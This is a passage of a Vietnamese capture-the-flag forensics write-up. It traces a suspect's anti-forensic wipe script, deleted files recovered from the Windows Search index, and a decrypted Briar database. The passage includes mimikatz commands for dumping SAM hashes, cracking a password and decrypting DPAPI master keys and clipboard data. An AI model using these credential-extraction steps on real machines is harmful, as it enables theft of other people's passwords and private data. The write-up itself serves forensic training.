    if os.path.exists(edge_data_path):
        for root, dirs, files in os.walk(edge_data_path, topdown=False):
            for file in files:
                filepath = os.path.join(root, file)
                
                if is_sqlite3(filepath):
                    wipe_sqlite_db(filepath)
                else:
                    secure_wipe_file(filepath)
            
            try:
                os.rmdir(root)
            except OSError:
                pass
        
        print(f"{GREEN}Edge data securely wiped.{RESET}")
    else:
        print(f"{YELLOW}Edge browser data path not found.{RESET}")

    print(f"{GREEN}All secure wipe operations complete.{RESET}")

if __name__ == '__main__':
    main()
```

đọc hàm `secure_wipe_file` thấy hàm này sẽ ghi đè nội dung file bằng byte *0x00*, đồng bộ xuống disk rồi xóa file
*Từ đây mình hướng tới cách giải là tìm tools có thể phục hồi được 2 cái file quan trọng này*

Mình có vọc được thêm file INBOX chứa nội dung của attacker. 
Navigate đến `AppData\Roaming\Thunderbird\Profiles\b62yv516.default-release\ImapMail\imap.gmail.com\`
 
![image](/images/bkiscctf2026/46.png)
Tìm thấy file **INBOX** có thể đọc được. Phần lớn là Google security alert (nhiễu), nhưng vẫn có phát hiện

![image](/images/bkiscctf2026/47.png)
```
From: K4ngTh3C0nq <kangtheconq_lmao123@proton.me>
Subject: Welcome to the team
Date: Tue, 31 Mar 2026 10:16:08 +0000
Content-Transfer-Encoding: base64
```
 
Decode body:
```python
import base64
b64 = "SGkgSG9yc2UsIGl0J3MgUG9ueS4gR2xhZCB0byBoZWFyIHRoZSBuZXcgaGFyZHdhcmUgYXJyaXZlZCBzYWZlbHk7IHRoYXQncyBvdXIgdGlja2V0IGluLiBJ4oCZdmUgYXR0YWNoZWQgdGhlIGludGVybmFsIHRhcmdldHMgYW5kIHRoZSBzcGVjaWZpYyBvcGVyYXRpb25hbCBzdGVwcyB5b3UgbmVlZCB0byBmb2xsb3cuIE1ha2Ugc3VyZSB5b3Uga2VlcCBhbGwgdGhlIHNlbnNpdGl2ZSBmaWxlcyBpbiBhIHNpbmdsZSwgZGVkaWNhdGVkIGRpcmVjdG9yeSBzbyB3ZSBjYW4gd2lwZSB0aGUgZXZpZGVuY2UgaW5zdGFudGx5IGlmIHRoaW5ncyBnbyBzb3V0aC4KCkxpbmsgdG8gaW5zdHJ1Y3Rpb25zICYgdGFyZ2V0OiBodHRwczovL2xpbWV3aXJlLmNvbS9kL0NVODZKI3ZiSkl4VGFaRGIKCk9uZSBtb3JlIHRoaW5ncywgeW91IG11c3QgZG93bmxvYWQgQnJpYXIgYW5kIG5hbWVkIGV4YWN0bHkgSG9yc2UsIGFuZCBhZGQgbXkgY29udGFjdCBicmlhcjovL2FkMzJoaW0yNnRkMjJzenUybGJzdDRoaWt5eWpta2x2NHJlcHNnajVmcmUydTRkd2Z6MmFvLiBZb3UgbXVzdCBnaXZlIG1lIHlvdXJzIHRvby4="
print(base64.b64decode(b64).decode())
```
Đọc được content bên trong mail:
```
Hi Horse, it's Pony. Glad to hear the new hardware arrived safely; that's our 
ticket in. I've attached the internal targets and the specific operational steps 
you need to follow. Make sure you keep all the sensitive files in a single, 
dedicated directory so we can wipe the evidence instantly if things go south.
 
Link to instructions & target: https://limewire.com/d/CU86K#vbJIxTaZDb
 
One more things, you must download Briar and named exactly Horse, and add my 
contact briar://ad32him26td22szu2lbst4hikyyjmklv4repsgj5fre2u4dwfz2ao. 
You must give me yours too.
```
 
→ Suspect tải `Instructions.pdf` + `target.txt` từ LimeWire, lưu vào `Documents\Boombaya\`, dùng **Briar** làm kênh liên lạc mã hóa
Thử nhấp vào link thì 404:vv
 
OK giờ mình quay lại với hướng giải ban đâu. Suspect chạy `nuke.py` để xóa bằng chứng **secure wipe** ghi đè toàn bộ file bằng null bytes trước khi xóa, khiến file carving không khả dụng:
 
```python
def secure_wipe_file(filepath):
    file_size = os.path.getsize(filepath)
    with open(filepath, 'r+b') as f:
        f.write(b'\x00' * file_size)
        f.flush()
        os.fsync(f.fileno())  # flush xuống physical disk
    os.unlink(filepath)
```
 
Tuy nhiên thì Windows Search Service đã **index và cache nội dung** của `Instructions.pdf` và `target.txt` trước khi chúng bị xóa → tức là dữ liệu vẫn còn trong `Windows.edb`. Như vậy nhiệm vụ của mình là đi tìm file này

`C:\ProgramData\Microsoft\Search\Data\Applications\Windows`
![image](/images/bkiscctf2026/48.png)

***Bước này là bước làm mình mất thời gian nhất vì mình đi grep strings với từng keyword=))) cơ mà nhờ vậy mình đã tìm được 1 manh mối rất quan trọng mà mãi về sau khi giải xong challenge mình mới thấy may mắn. Đó là tìm được link ggdrive của file tool.zip mà không cần phải decrypt Clipboard DPAPI (mặc dù mình vẫn làm cách này và tìm được password và master key của user briaf)***
![image](/images/bkiscctf2026/49.png)

***https://drive.google.com/drive/folders/1GwJ1AjIQAYCHj_Gxio5dcpoR-36lOKb7?usp=sharing***

Thế mà lại hay
![image](/images/bkiscctf2026/50.png)
just meme=]]

Và tất nhiên mình phải mất khá lâu và đi hỏi lung tung thì mới biết tới công cụ [SIDR](https://github.com/strozfriedberg/sidr) để parse ESE database

```bash
git clone https://github.com/strozfriedberg/sidr.git
cd sidr && cargo build --release
 
./target/release/sidr -f csv -o ~/sidr_output /path/to/folder/containing/Windows.edb/
```
 
Output sinh ra nhiều file csv
![image](/images/bkiscctf2026/51.png)

nhưng để grep với các keyword với các file DESKTOP trước 
```
grep -i "instruction\|target\|BKISC\|secret\|briar\|Base32" \
  DESKTOP-124K5L1_File_Report_*_dirty.csv
```

![Screenshot 2026-05-17 122008](/images/bkiscctf2026/52.png)
thì ra được content trong file `target.txt` chứa part1 của flag đang bị encrypt bằng b32 
![Screenshot 2026-05-17 121321](/images/bkiscctf2026/53.png)
> BKISC{Woah_I_r34lly_dunno_
 
Ngoài ra SIDR còn trả về cached content của `Instructions.pdf` (WorkId 2871):
 
```
Path: C:\Users\supadupadev\Documents\Boombaya\Instructions.pdf
Red Team Operations: Phishing Campaign ...
For further content, the secret we will use along the way is: 
Mot_con_vit_xoe_r4_h4i_c4i_c4nh!!!
```
 
→ **Briar app password:** `Mot_con_vit_xoe_r4_h4i_c4i_c4nh!!!`
 

Đến đây rồi thì tìm part2 khá đơn giản, như đã đề cập ở trên, mình đã may mắn sử dụng tà đạo grep string và tìm được link gg drive chứa file tools.zip và sử dụng password vừa tìm được để giải nén

Tiếp tục grep strings 
`strings tools.exe | grep "gist.github"`
![image](/images/bkiscctf2026/54.png)
![image](/images/bkiscctf2026/55.png)

Thấy được 1 đoạn mã được encrypt bằng b45, như vậy ta dễ dàng có được part2 của flag
![image](/images/bkiscctf2026/56.png)

Vậy ta có flag hoàn chỉnh
> BKISC{Woah_I_r34lly_dunno_whut_t0_s4y_here_n0_idea_T^T}


Ở đây mình sẽ note luôn cách Clipboard DPAPI Decryption nếu lỡ không tìm được file ggdrive trong lúc grep string

Export `SAM` + `SYSTEM` từ `C:\Windows\System32\config\`, dùng mimikatz:
 
```
lsadump::sam /system:SYSTEM /sam:SAM
→ supadupadev: a3403f6e5db051f4110680a63dd29691
```

Crack bằng crackstation → kangkong

 
Decrypt MasterKey tại `AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1001\33394d46-...`:

![image](/images/bkiscctf2026/57.png)


```
mimikatz # dpapi::masterkey /in:33394d46-41d9-494e-86c7-1b0ea4d0d5c9 /sid:S-1-5-21-4096025575-3958345073-1841117829-1001 /password:kangkong
 
[masterkey] with password: kangkong (normal user)
key  : 4d59a1889dfd27ae39ad952533f9c070b77e9053...
sha1 : 8ed338cb44d7c271b0e21b32ed2fe5480eaf9e2f
```
 
Windows lưu **pinned clipboard items** tại:
`AppData\Local\Microsoft\Windows\Clipboard\Pinned`

![image](/images/bkiscctf2026/58.png)
File `VGV4dA==` bắt đầu bằng header `30 82 ... 06 09 2a 86 48 86 f7 0d 01 07 03` → **ASN.1 CMS EnvelopedData** bao ngoài DPAPI blob. DPAPI magic `01 00 00 00 d0 8c 9d df` nằm ở **offset 45**.
 
```python
from dpapick3 import blob as dpapi_blob
 
data = open('VGV4dA==', 'rb').read()
offset = data.find(bytes.fromhex('01000000d08c9ddf'))  
b = dpapi_blob.DPAPIBlob(data[offset:])
# b.mkguid → 33394d46-41d9-494e-86c7-1b0ea4d0d5c9 ✓
 
masterkey = bytes.fromhex('4d59a1889dfd27ae...')
b.decrypt(masterkey)
print(b.cleartext.hex())
# → 291bf76c9f9701e50e278031549d860547d2d178b63fbaf357f9262168785571
```
 
→ 32 bytes này là **Scrypt-derived wrapping key** mà suspect vô tình copy vào clipboard.
 
File `db.key` (218 bytes trên disk) là **hex string** → decode ra 109 bytes binary.
 
**Format của Briar db.key** (bramble-core):
 
| Offset | Size | Field |
|--------|------|-------|
| 0 | 1 | Version (0x00) |
| 1 | 32 | Scrypt salt |
| 33 | 4 | Scrypt N (BE int32) = `0x00020000` = 131072 = 2¹⁷ |
| 37 | 24 | XSalsa20 nonce |
| 61 | 48 | Ciphertext + Poly1305 MAC |
 
Briar dùng **XSalsa20-Poly1305** (NaCl SecretBox), key derive từ Scrypt với password là Briar app password:
 
```python
import hashlib
from nacl.secret import SecretBox
 
db = bytes.fromhex('00f63da9bc7c9265...')  # db.key hex-decoded
salt, nonce, ct = db[1:33], db[37:61], db[61:109]
 
password = "Mot_con_vit_xoe_r4_h4i_c4i_c4nh!!!".encode()
wrapping_key = hashlib.scrypt(password, salt=salt, n=131072, r=8, p=1, dklen=32)
 
h2_key = SecretBox(wrapping_key).decrypt(ct, nonce)
print("H2 DB Key:", h2_key.hex())
```
Sau khi có key, mở `db.mv.db` bằng **H2 Console**:
```
JDBC URL:  jdbc:h2:/path/to/db;CIPHER=AES
Password:  <h2_key_hex> 
```
 
```sql
SELECT * FROM MESSAGES ORDER BY TIMESTAMP;
```
 
Chat giữa Horse và Pony chứa link Google Drive đến `tools.zip` kèm password giải nén.

## Lời kết

![image](/images/bkiscctf2026/59.png)

Rất cảm ơn các tác giả đã đem đến những challenge chất lượng và thú vị. Qua quá trình giải đề, mình đã học hỏi thêm được nhiều kỹ thuật mới. Hy vọng BKISC sẽ tiếp tục duy trì phong độ và mang đến nhiều sân chơi bổ ích như thế này trong tương lai! GGWP